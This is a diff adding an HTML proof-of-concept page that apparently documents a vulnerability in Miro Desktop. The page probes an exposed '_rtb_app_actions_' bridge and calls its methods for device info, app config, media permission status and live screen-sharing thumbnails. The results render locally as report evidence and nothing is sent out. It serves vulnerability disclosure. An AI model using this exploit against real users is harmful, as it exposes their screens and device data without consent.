@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Miro Desktop — _rtb_app_actions_ bridge PoC</title>
+<style>
+  body { font-family: -apple-system, Segoe UI, sans-serif; background:#0d1117; color:#e6edf3; margin:0; padding:24px; }
+  h1 { font-size: 20px; }
+  .card { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px; margin-bottom:16px; }
+  .ok { color:#3fb950; }
+  .bad { color:#f85149; }
+  .warn { color:#d29922; }
+  pre { white-space: pre-wrap; word-break: break-all; background:#0d1117; padding:8px; border-radius:6px; font-size:12px; }
+  button { background:#238636; color:#fff; border:none; padding:8px 14px; border-radius:6px; cursor:pointer; font-size:14px; margin-right:8px; }
+  button:disabled { background:#30363d; cursor:not-allowed; }
+  .thumbs { display:flex; flex-wrap:wrap; gap:10px; }
+  .thumb { border:1px solid #30363d; border-radius:6px; padding:6px; width:220px; }
+  .thumb img { width:100%; border-radius:4px; display:block; }
+  .thumb .label { font-size:11px; color:#8b949e; margin-top:4px; word-break:break-all; }
+  .status-line { font-size:13px; margin:4px 0; }
+  #origin { font-size:12px; color:#8b949e; }
+</style>
+</head>
+<body>
+
+<h1>Miro Desktop — <code>_rtb_app_actions_</code> exposure check</h1>
+<p id="origin">Loaded from: <code id="origin-val"></code> at <span id="time-val"></span></p>
+
+<div class="card">
+  <div id="bridge-status" class="status-line">Checking for <code>window._rtb_app_actions_</code>…</div>
+  <div id="bridge-methods"></div>
+</div>
+
+<div class="card" id="actions-card" style="display:none;">
+  <div><button id="btn-info">1. Get device / app info</button>
+       <button id="btn-media">2. Get media access status</button>
+       <button id="btn-screens">3. Get screen sharing sources</button></div>
+  <p style="font-size:12px;color:#8b949e;">Nothing on this page sends data anywhere else — everything is
+  rendered locally below for your own screenshots / report evidence.</p>
+</div>
+
+<div class="card" id="info-out" style="display:none;">
+  <h3>Device / app config</h3>
+  <pre id="info-pre"></pre>
+</div>
+
+<div class="card" id="media-out" style="display:none;">
+  <h3>Media access status</h3>
+  <pre id="media-pre"></pre>
+</div>
+
+<div class="card" id="screens-out" style="display:none;">
+  <h3>Screen sharing sources</h3>
+  <div id="screens-meta" class="status-line"></div>
+  <div class="thumbs" id="screens-thumbs"></div>
+</div>
+
+<script>
+(function () {
+  document.getElementById('origin-val').textContent = window.location.href;
+  document.getElementById('time-val').textContent = new Date().toISOString();
+
+  var statusEl = document.getElementById('bridge-status');
+  var methodsEl = document.getElementById('bridge-methods');
+  var actionsCard = document.getElementById('actions-card');
+
+  var bridge = window._rtb_app_actions_;
+
+  if (!bridge) {
+    statusEl.innerHTML = '<span class="bad">✗ window._rtb_app_actions_ is NOT present.</span> ' +
+      'Either this page was not loaded inside the vulnerable webview context, ' +
+      'or the exposure has been fixed.';
+    return;
+  }
+
+  statusEl.innerHTML = '<span class="ok">✓ window._rtb_app_actions_ IS present on this origin.</span>';
+  var methods = Object.keys(bridge);
+  methodsEl.innerHTML = '<div class="status-line">Exposed methods: <code>' + methods.join(', ') + '</code></div>';
+  actionsCard.style.display = 'block';
+
+  function show(id) { document.getElementById(id).style.display = 'block'; }
+
+  document.getElementById('btn-info').addEventListener('click', function () {
+    var out = {};
+    try { out.deviceInfo = bridge.getDeviceInfo ? bridge.getDeviceInfo() : 'method not present'; }
+    catch (e) { out.deviceInfoError = String(e); }
+    try { out.appConfig = bridge.getAppConfig ? bridge.getAppConfig() : 'method not present'; }
+    catch (e) { out.appConfigError = String(e); }
+    document.getElementById('info-pre').textContent = JSON.stringify(out, null, 2);
+    show('info-out');
+  });
+
+  document.getElementById('btn-media').addEventListener('click', function () {
+    if (!bridge.getMediaAccessStatus) {
+      document.getElementById('media-pre').textContent = 'getMediaAccessStatus not present';
+      show('media-out');
+      return;
+    }
+    Promise.all(['microphone', 'camera', 'screen'].map(function (type) {
+      return Promise.resolve(bridge.getMediaAccessStatus(type))
+        .then(function (granted) { return type + ': ' + granted; })
+        .catch(function (e) { return type + ': error - ' + e; });
+    })).then(function (results) {
+      document.getElementById('media-pre').textContent = results.join('\n');
+      show('media-out');
+    });
+  });
+
+  document.getElementById('btn-screens').addEventListener('click', function () {
+    if (!bridge.getScreenSharingSources) {
+      document.getElementById('screens-meta').textContent = 'getScreenSharingSources not present';
+      show('screens-out');
+      return;
+    }
+    document.getElementById('screens-meta').textContent = 'Requesting sources…';
+    show('screens-out');
+    Promise.resolve(bridge.getScreenSharingSources({
+      includeScreens: true,
+      includeAppWindows: true,
+      thumbnailWidth: 640,
+      thumbnailHeight: 360
+    })).then(function (sources) {
+      var metaEl = document.getElementById('screens-meta');
+      var thumbsEl = document.getElementById('screens-thumbs');
+      thumbsEl.innerHTML = '';
+      if (!sources || !sources.length) {
+        metaEl.innerHTML = '<span class="warn">Call returned no sources (' + JSON.stringify(sources) + ')</span>';
+        return;
+      }
+      metaEl.innerHTML = '<span class="ok">Received ' + sources.length + ' source(s).</span> ' +
+        'These are live thumbnails of the desktop / open windows, rendered from data returned by the bridge.';
+      sources.forEach(function (s) {
+        var div = document.createElement('div');
+        div.className = 'thumb';
+        var img = document.createElement('img');
+        img.src = s.thumbnailUrl || '';
+        var label = document.createElement('div');
+        label.className = 'label';
+        label.textContent = (s.name || 'unnamed') + ' — ' + (s.screenWidth || '?') + 'x' + (s.screenHeight || '?');
+        div.appendChild(img);
+        div.appendChild(label);
+        thumbsEl.appendChild(div);
+      });
+    }).catch(function (e) {
+      document.getElementById('screens-meta').innerHTML = '<span class="bad">Error: ' + String(e) + '</span>';
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
